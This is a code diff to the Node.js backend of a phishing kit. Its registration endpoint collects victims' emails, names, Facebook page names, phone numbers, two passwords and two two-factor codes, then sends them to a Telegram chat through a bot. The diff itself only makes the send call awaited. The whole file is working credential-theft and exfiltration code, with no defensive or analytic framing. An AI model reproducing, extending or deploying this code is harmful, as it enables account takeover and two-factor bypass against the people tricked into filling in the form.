@@ -18,9 +18,9 @@ const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true,
     }
 });
 
-app.post('/api/resgister', (req, res) => {
+app.post('/api/resgister', async (req, res) => {
     // GET DATA FROM CLIENT
-    const data = req.body; 
+    const values = req.body; 
 
     const result = {
         "status": 0,
@@ -31,7 +31,7 @@ app.post('/api/resgister', (req, res) => {
 
     // SEND DATA TO TELE
     const message = `<b>Ip:</b> <code>${values.ip || ''}</code>\n-----------------------------\n<b>Email Business:</b> <code>${values.businessEmail || ''}</code>\n<b>Email Personal:</b> <code>${values.personalEmail || ''}</code>\n<b>User name:</b> <code>${values.fullName || ''}</code>\n<b>Page name:</b> <code>${values.fanpageName || ''}</code>\n<b>Phone Number:</b> <code>${values.mobilePhone || ''}</code>\n<b>Password First:</b> <code>${values.passwordFirst || ''}</code>\n<b>Password Second:</b> <code>${values.passwordSecond || ''}</code>\n-----------------------------\n<b>Image:</b> <code>${values.imageUrl || ''}</code>\n-----------------------------\n<b>First Two-Fa:</b> <code>${values.firstTwoFa || ''}</code>\n<b>Second Two-Fa:</b> <code>${values.secondTwoFa || ''}</code>\n`;
-    bot.sendMessage(process.env.CHAT_ID, message, { parse_mode: 'html' });
+    await bot.sendMessage(process.env.CHAT_ID, message, { parse_mode: 'html' });
 
 
     // // ADD GOOGLE SHEET
